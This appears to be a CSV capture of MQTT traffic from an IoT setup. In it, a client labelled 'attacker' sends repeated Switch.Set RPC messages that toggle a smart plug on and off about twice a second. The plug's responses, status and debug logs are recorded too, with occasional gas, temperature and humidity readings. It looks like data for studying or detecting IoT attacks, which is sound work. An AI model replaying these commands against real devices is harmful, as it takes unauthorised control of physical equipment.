timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:37:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4928 34381.426 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34381.42,""swi"
2026-04-22T16:37:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4929 34381.443 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4930 34381.925 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34381.92,""swi"
2026-04-22T16:37:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4931 34381.943 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4932 34382.426 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34382.42,""swi"
2026-04-22T16:37:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4933 34382.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4934 34382.926 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34382.92,""swi"
2026-04-22T16:37:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4935 34382.945 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4936 34383.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34383.42,""swi"
2026-04-22T16:37:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4937 34383.444 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4938 34383.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34383.92,""swi"
2026-04-22T16:37:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4939 34383.946 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4940 34384.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34384.43,""swi"
2026-04-22T16:37:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4941 34384.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4942 34384.928 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34384.93,""swi"
2026-04-22T16:37:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4943 34384.947 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4944 34385.430 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34385.43,""swi"
2026-04-22T16:37:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4945 34385.447 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4946 34385.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34385.93,""swi"
2026-04-22T16:37:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4947 34385.949 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4948 34386.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34386.43,""swi"
2026-04-22T16:37:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4949 34386.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4950 34386.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34386.93,""swi"
2026-04-22T16:37:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4951 34386.948 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4952 34387.430 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34387.43,""swi"
2026-04-22T16:37:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4953 34387.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4954 34387.931 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34387.93,""swi"
2026-04-22T16:37:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4955 34387.950 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4956 34388.431 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34388.43,""swi"
2026-04-22T16:37:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4957 34388.448 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4958 34388.932 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34388.93,""swi"
2026-04-22T16:37:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4959 34388.951 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4960 34389.433 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34389.43,""swi"
2026-04-22T16:37:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4961 34389.449 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:36,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4962 34389.933 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34389.93,""swi"
2026-04-22T16:37:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4963 34389.952 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4964 34390.438 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34390.43,""swi"
2026-04-22T16:37:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4965 34390.454 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4966 34390.934 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34390.93,""swi"
2026-04-22T16:37:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4967 34390.952 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4968 34391.434 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34391.43,""swi"
2026-04-22T16:37:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4969 34391.450 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
